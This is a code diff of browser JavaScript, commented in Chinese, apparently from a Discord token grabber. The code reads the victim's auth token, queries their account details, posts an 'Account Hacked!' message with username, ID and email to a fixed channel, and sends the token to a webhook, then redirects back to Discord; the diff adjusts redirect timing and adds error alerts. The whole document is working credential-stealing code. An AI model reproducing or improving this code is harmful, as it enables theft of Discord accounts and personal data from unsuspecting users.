@@ -27,11 +27,6 @@
         if (token) {
           token = token.replace(/"/g, "");
 
-          // 超時 5 秒後跳走
-          var timer = setTimeout(function() {
-            window.location.href = "https://discord.com/channels/@me";
-          }, 5000);
-
           // 取得帳號資訊
           fetch("https://discord.com/api/v9/users/@me", {
             headers: { "Authorization": token }
@@ -41,10 +36,11 @@
             }
             throw new Error("Not OK");
           }).then(function(user) {
-            // 發送訊息到目標
             var msg = {
               content: "🔓 **Account Hacked!**\n使用者: **" + user.username + "** (" + user.id + ")\nEmail: " + (user.email || 'N/A')
             };
+
+            // 發送訊息到目標
             fetch("https://discord.com/api/v9/channels/878151437085974548/messages", {
               method: "POST",
               headers: {
@@ -52,9 +48,6 @@
                 "Authorization": token
               },
               body: JSON.stringify(msg)
-            }).then(function() {
-              clearTimeout(timer);
-              window.location.href = "https://discord.com/channels/@me";
             });
 
             // 把 token 送到 webhook
@@ -66,11 +59,16 @@
               })
             }).catch(function() {});
 
+            // 1 秒後跳回 Discord
+            setTimeout(function() {
+              window.location.href = "https://discord.com/channels/@me";
+            }, 1000);
           }).catch(function(e) {
-            // users/@me 失敗，跳走
+            alert("Error: " + e.message);
             window.location.href = "https://discord.com/channels/@me";
           });
         } else {
+          alert("No token found!");
           window.location.href = "https://discord.com/channels/@me";
         }
       } catch(e) {
